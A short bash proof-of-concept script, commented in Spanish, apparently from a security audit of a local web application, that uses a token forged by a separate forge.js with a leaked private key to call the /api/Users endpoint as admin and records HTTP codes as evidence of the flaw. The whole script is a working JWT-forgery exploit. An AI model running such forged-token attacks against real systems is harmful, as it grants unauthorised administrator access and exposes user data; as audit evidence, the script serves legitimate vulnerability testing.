#!/usr/bin/env bash
# V-05 · JWT forjado con la clave privada filtrada (lib/insecurity.ts:21) -> acceso como admin
set -uo pipefail
BASE_URL="${BASE_URL:-http://127.0.0.1:3000}"
HERE="$(cd "$(dirname "$0")" && pwd)"; EVID="${EVID:-$HERE/../../evidencias/h2-V-05-jwt-forgery}"; mkdir -p "$EVID"
echo "[$(TZ=America/Guatemala date '+%Y-%m-%d %H:%M:%S %Z')] V-05 JWT forgery -> $BASE_URL"
FTOK=$(node "$HERE/forge.js"); echo "$FTOK" > "$EVID/token-forjado.txt"
echo "control SIN token:"
C0=$(curl -s -o /dev/null -w '%{http_code}' "$BASE_URL/api/Users/?size=2"); echo "  GET /api/Users/ -> HTTP $C0"
echo "con token FORJADO (role=admin, sin credenciales):"
C1=$(curl -s -H "Authorization: Bearer $FTOK" "$BASE_URL/api/Users/?size=3" -o "$EVID/api-users-con-token-forjado.json" -w '%{http_code}')
echo "  GET /api/Users/ -> HTTP $C1"; echo "sin_token=$C0 con_token_forjado=$C1" > "$EVID/http_code.txt"
if [ "$C0" = "401" ] && [ "$C1" = "200" ]; then
  echo "VULN CONFIRMADA (V-05): sin token=401, con token forjado=200. La clave del código permite emitir tokens admin válidos."
else
  echo "RESULTADO inesperado (control=$C0 forjado=$C1)"; fi
